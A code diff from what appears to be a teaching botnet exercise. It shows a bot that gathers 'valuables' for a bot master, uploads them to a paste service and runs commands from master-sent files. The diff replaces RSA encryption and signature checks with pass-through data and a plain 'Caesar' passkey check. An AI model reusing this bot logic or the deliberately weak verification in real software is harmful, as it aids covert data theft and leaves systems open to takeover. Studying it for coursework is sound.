@@ -1,6 +1,4 @@
 import os
-from botMaster.RSASignVerify import RSASignAndVerify
-from botMaster.RSAEncrypterDecrypter import RSAEncrypterDecrypter
 
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
@@ -15,7 +13,7 @@ def save_valuable(data):
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
-    return RSAEncrypterDecrypter().encrypt_using_master_public(data)
+    return data
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
@@ -32,26 +30,15 @@ def upload_valuables_to_pastebot(fn):
 
 ###
 
-
 def verify_file(f):
-    # Verify the file sent by the master using pycrypto verifier
-    expected_message_length = 1024
-
-    # We assume there that an unsigned file will not contain more than 1024 bytes of data
-    # So if a file is less than the specified amount of bytes exclude it
-    # And if an attacker has modified the file by adding some bytes to the message, discard it too
-    if len(f) > expected_message_length or len(f) < 1024:
-        return False
-
-    # Extract the ciphertext and the signature which are 512 bytes each
-    size_of_message_or_signature = 512
-    signature = f[:size_of_message_or_signature]
-    ciphertext = f[size_of_message_or_signature:]
-    message = RSAEncrypterDecrypter().decrypt_using_bot_private(ciphertext)
-
-    # Verify the signature from the received ciphertext and signature
-    return RSASignAndVerify().verify_signature(ciphertext, signature)
-
+    # Verify the file was sent by the bot master
+    # TODO: For Part 2, you'll use public key crypto here
+    # Naive verification by ensuring the first line has the "passkey"
+    lines = f.split(bytes("\n", "ascii"), 1)
+    first_line = lines[0]
+    if first_line == bytes("Caesar", "ascii"):
+        return True
+    return False
 
 def process_file(fn, f):
     if verify_file(f):
@@ -94,8 +81,6 @@ def p2p_upload_file(sconn, fn):
     sconn.send(fn)
     sconn.send(filestore[fn])
 
-# For future. If the file's signature has been accepted then decrypt the ciphertext here by using the
-# static class RSAEncrypterDecrypter and run the commands
 def run_file(f):
     # If the file can be run,
     # run the commands
